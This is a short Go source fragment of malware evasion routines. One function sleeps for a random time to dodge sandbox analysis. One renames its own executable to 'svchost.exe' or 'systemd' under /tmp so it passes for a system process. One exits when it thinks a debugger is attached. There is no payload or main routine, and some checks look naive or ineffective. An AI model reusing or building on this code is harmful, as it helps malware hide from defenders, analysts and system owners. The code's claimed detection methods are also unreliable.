package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"time"
)

func delayEvasion() {
	rand.Seed(time.Now().UnixNano())
	sleepTime := rand.Intn(10) + 5
	fmt.Printf("[*] Sleeping for %d seconds\n", sleepTime)
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func hideProcess() {
	processName := "svchost.exe"
	if runtime.GOOS == "linux" {
		processName = "systemd"
	}

	proc, err := os.Executable()
	if err == nil {
		os.Rename(proc, "/tmp/"+processName)
	}
}

func antiDebug() {
	_, err := os.Open("\\\\.\\pipe\\DebugPipe")
	if err == nil {
		fmt.Println("[-] Debugger detected, exiting...")
		os.Exit(1)
	}
}
